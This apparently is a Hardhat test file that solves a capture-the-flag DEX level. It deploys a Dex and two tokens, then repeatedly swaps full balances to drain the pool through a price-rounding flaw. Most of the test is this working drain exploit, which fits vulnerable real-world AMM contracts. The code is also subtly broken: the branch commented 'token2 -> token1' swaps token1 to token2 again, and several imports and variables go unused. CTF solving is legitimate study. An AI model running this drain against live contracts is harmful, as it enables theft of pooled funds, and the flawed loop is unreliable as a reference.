import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let eoa: Signer;
let other1: Signer;
let other2: Signer;
let attacker: Contract;
let dex: Contract; // challenge contract
let swapToken1: Contract;
let swapToken2: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, other1, other2] = accounts;
  
  const dexFactory = await ethers.getContractFactory(`Dex`)
  dex = await dexFactory.connect(other2).deploy()

  const swapTokenFactory = await ethers.getContractFactory(`SwappableToken`)
  swapToken1 = await swapTokenFactory.connect(other2).deploy(dex.address,"token1","tok1",precision.mul(1000))
  swapToken2 = await swapTokenFactory.connect(other2).deploy(dex.address,"token2","tok2",precision.mul(1000))

  await dex.connect(other2).setTokens(swapToken1.address,swapToken2.address)
  await swapToken1.connect(other2).transfer(dex.address,precision.mul(100))
  await swapToken2.connect(other2).transfer(dex.address,precision.mul(100))

  await swapToken1.connect(other2).transfer(await eoa.getAddress(),precision.mul(10))
  await swapToken2.connect(other2).transfer(await eoa.getAddress(),precision.mul(10))
});

it("solves the challenge", async function () {
  
  let iterator = 0
  let tok1Bal,tok2Bal

  await dex.connect(eoa).approve(dex.address,ethers.constants.MaxUint256)

  // when draining pool of one token, the drained token becomes worth more, so can loop
  // however the division done in getSwapPrice does not account for precision
  while (true) { 
    tok1Bal = await dex.connect(eoa).balanceOf(swapToken1.address,await eoa.getAddress())
    tok2Bal = await dex.connect(eoa).balanceOf(swapToken2.address,await eoa.getAddress())

    if (tok1Bal == 0 || tok2Bal == 0) {
      break
    }

    if (iterator % 2 == 0) { // token1 -> token2
      await dex.connect(eoa).swap(swapToken1.address,swapToken2.address,tok1Bal)  
    } else { // token2 -> token1
      await dex.connect(eoa).swap(swapToken1.address,swapToken2.address,tok2Bal)
    }
    iterator++
  } 

  console.log(tok1Bal.div(precision).toString(),tok2Bal.div(precision).toString())

});

after(async () => {
});
